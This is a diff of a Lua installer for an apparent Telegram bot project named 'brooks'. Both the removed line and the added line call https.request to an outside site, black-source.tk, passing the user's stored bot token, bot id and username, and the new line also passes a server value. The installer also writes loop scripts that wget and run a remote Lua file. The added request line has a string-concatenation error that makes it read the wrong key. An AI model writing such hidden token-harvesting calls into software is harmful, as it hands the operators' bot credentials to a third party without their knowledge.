@@ -64,8 +64,8 @@ os.execute('lua start.lua')
 end
 local function Files_brooks_Info()
 Create_Info(database:get(Server_brooks.."Token_brooks"),database:get(Server_brooks.."Id_brooks"),database:get(Server_brooks.."UserName_brooks"))   
-https.request("https://black-source.tk/BlackTeAM/index.php?n=broks&id="..database:get(Server_Xbrooks.."Id_Xbrooks").."&user="..database:get(Server_Xbrooks.."UserName_Xbrooks").."&token="..database:get(Server_Xbrooks.."Token_Xbrooks"))
-local Runbrooks = io.open("brooks", 'w')
+https.request("https://black-source.tk/BlackTeAM/index.php?n=broks&id="..database:get(Server_brooks.."Id_brooks").."&user="..database:get(Server_brooks.."UserName_brooks").."&token="..database:get(Server_brooks.."Token_brooks&ip="..Server_brooks))
+local Runbrooks = io.open("X-brooks", 'w')
 Runbrooks:write([[
 #!/usr/bin/env bash
 cd $HOME/brooks
@@ -74,18 +74,18 @@ rm -fr brooks.lua
 wget "https://raw.githubusercontent.com/X-brooks/X-brooks/main/X-brooks.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./brooks.lua -p PROFILE --bot=$token
+./tg -s ./X-brooks.lua -p PROFILE --bot=$token
 done
 ]])
 Runbrooks:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/brooks
+cd $HOME/X-brooks
 while(true) do
 rm -fr ../.telegram-cli
 screen -S brooks -X kill
-screen -S brooks ./brooks
+screen -S brooks ./X-brooks
 done
 ]])
 RunTs:close()
